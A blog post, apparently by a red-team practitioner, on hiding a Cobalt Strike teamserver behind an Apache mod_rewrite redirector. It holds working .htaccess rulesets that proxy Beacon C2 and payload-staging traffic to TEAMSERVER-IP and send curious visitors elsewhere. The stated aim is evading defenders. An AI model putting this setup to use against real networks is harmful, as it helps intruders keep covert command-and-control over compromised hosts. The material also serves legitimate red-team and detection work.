---
layout: post
title: Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite
summary: How to set up a Command and Control redirector to only allow Cobalt Strike's C2 through. Uses Apache's rewrite module to handle the filtering.
tags: 
- mod_rewrite
- cobalt strike
- red team infrastructure
image: /assets/apache/cobalt-strike-http-c2-demo.gif
commentIssueId: 13
---

Imagine you are performing a Red Team engagement. So far it's been very hard, fighting tooth and nail to get each step closer to totally owning their network. You finally get internal network access and things are stable. Everything looks good on your end, but on the Blue side of things IT is taking notice of traffic flowing to an unknown domain. A curious IT worker opens their browser and navigates to the site. 404 error. Suspicion++. Five minutes later your Beacons become unresponsive. You're blocked. Now you have to spin up some new infrastructure and get in again.

I am willing to bet we've all been in a similar situation at least once. One way we can reduce the risk of being caught is by using a redirector host to allow only command and control (C2) traffic reach our Cobalt Strike server and redirect all other traffic to an innocuous website, such as the target's site. A simple way to do this is using an Apache redirector as an intermediary server. Our C2 domain will point at the Apache redirector, which will perform the traffic filtering. An added benefit of using a separate host in this setup is if our domain is burned, our real Cobalt Strike team server's IP will still be useable. We can roll the redirector, get a new IP and domain, and be back in business. If we set up multiple callback domains in our Beacon payload, we won't even need to regain initial access.


# Infrastructure

You will need a fresh host to use as the Apache redirector. The host should be relatively easy to reconfigure with a new public IP. While a colo host will work, using a VPS is often an easier option. Keep in mind that all traffic used by Beacon will be received and sent back out (to your Cobalt Strike teamserver) by the host, so spec out the bandwidth and resources accordingly. Of course, the obligatory warning stands: make sure you understand your provider's Terms of Service and any applicable laws before using this for an engagement. 

Here is what our infrastructure will look like:
![Cobalt Strike HTTP C2 Redirector Infrastructure](/assets/apache/cobalt-strike-http-c2.png)


# Cobalt Strike

As you may expect, Cobalt Strike's Beacons use GET and POST requests for HTTP communications. Requests are made to URIs configured within the team server's Malleable C2 profile. Within the profile we can configure the request URIs, headers, parameters, and a number of other C2 options. I *highly* recommend reading the [documentation](https://www.cobaltstrike.com/help-malleable-c2) on Malleable C2 before using it; it's powerful! [@harmj0y's](https://twitter.com/harmj0y) post [A Brave New World: Malleable C2](http://www.harmj0y.net/blog/redteaming/a-brave-new-world-malleable-c2/) provides additional great insight.

For demonstration, we will use @harmj0y's Zeus Malleable C2 profile available [here](https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/crimeware/zeus.profile). The profile configures Beacons to use the following C2 settings:

* user-agent: *Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)*
* HTTP GET URI: */metro91/admin/1/ppptp.jpg* 
* HTTP POST URI: */metro91/admin/1/secure.php*

To start Cobalt Strike with a Malleable C2 profile, use the following syntax:

```bash
./teamserver <Public IP> <password> </path/to/profile>
```

Make sure to configure your Cobalt Strike listeners and payloads to call out to your redirection domain(s), *spoofdomain.com* in our example. During a Red Team engagement, you will likely configure multiple callback domains

# Apache 

To set up Apache to use mod_rewrite, follow the first-time setup steps outlined in my [previous mod_rewrite post](https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/). 

*Update: [e0x70i](https://github.com/e0x70i) pointed out in the comments below that if your Cobalt Strike Malleable C2 profile contains an Accept-Encoding header for gzip, your Apache install may compress that traffic by default and cause your Beacon to be unresponsive or function incorrectly. To overcome this, disable mod_deflate (via `a2dismod deflate` and add the No Encode (`[NE]`) flag to your rewrite rules. (Thank you, e0x70i!)*

The way we configure our htaccess rules will depend on whether we need to support staged Beacons, such as [Scripted Web Delivery](https://www.cobaltstrike.com/help-scripted-web-delivery), or not. 

## HTTP C2 Redirection Ruleset

To only perform HTTP C2 redirection, place the following ruleset in a *.htaccess* file within the Apache web root:

```plaintext
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/(metro91/admin/1/ppptp.jpg|metro91/admin/1/secure.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteRule ^.*$ http://example.com/? [L,R=302]
```

Replace *TEAMSERVER-IP* with the WAN IP of your Cobalt Strike team server. After saving the file, Apache will send requests for an approved URI with the user-agent configured in the Malleable C2 profile to our Cobalt Strike team server and redirect all other requests to *http://example.com/*. The question mark towards in line 7 ends the rewrite and redirects the user to exactly *http://example.com/*. If you want to retain the original request URI, delete the question mark.

Notice that the two expected HTTP URIs on line 4 are split by a pipe, enclosed in parentheses, and omit the leading forward slash. You can add other URIs the same way; this line is evaluated as a regular expression. Also note that the HTTP User Agent regex on line 3 requires all spaces, periods, and parentheses be escaped.

 
If you configure your Cobalt Strike listener to use a port other than port 80, you will need to configure Apache to [listen on that port](http://httpd.apache.org/docs/current/bind.html). By default on Debian, you can edit the port(s) Apache listens on in `/etc/apache2/ports.conf` and `/etc/apache2/sites-enabled/000-default.conf`. 


## HTTP C2 Redirection with Payload Staging Support
```plaintext
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/updates/?$
RewriteCond %{HTTP_USER_AGENT} ^$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteCond %{REQUEST_URI} ^/..../?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteCond %{REQUEST_URI} ^/(metro91/admin/1/ppptp.jpg|metro91/admin/1/secure.php)/?$
RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 6\.0;\ Windows\ NT\ 5\.1;\ SV1;\ InfoPath\.2\)?$
RewriteRule ^.*$ http://TEAMSERVER-IP%{REQUEST_URI} [P]
RewriteRule ^.*$ http://example.com/? [L,R=302]
```

New rules are added to lines 2 - 7. 

On line 2 the */updates/* URI is the URI configured in our Scripted Web Delivery. When the target host executes the web delivery command, it will first make a GET request to the configured URI with a blank HTTP User Agent. Lines 2 - 4 allow the request to be proxied to our teamserver. The next request the target host makes is GET to a random four character URI with the HTTP User Agent configured in the Malleable C2 profile. 

Lines 5 - 7 allow this second request through. It is possible that this pattern will change, so be sure to test your rulesets and makes changes accordingly to allow the full staging process to occur.


Here's a demo showing the C2 URL be visited by an end-user, running the Scripted Web Delivery command pulling from the same URL, and establishing a Beacon session through the redirector:
![Cobalt Strike HTTP C2 Redirector Demo](/assets/apache/cobalt-strike-http-c2-demo.gif)

# Summary

In a Red Team engagement, keeping core infrastructure hidden from defenders and flexible to change is crucial. Using Apache's mod_rewrite module we can obscure our command and control (C2) servers behind a VPS that is easily replaced. This way if a defender blocks our C2 domain and its IP, our fallback domains can be pointed to another VPS that proxies requests to the same teamserver used previously.


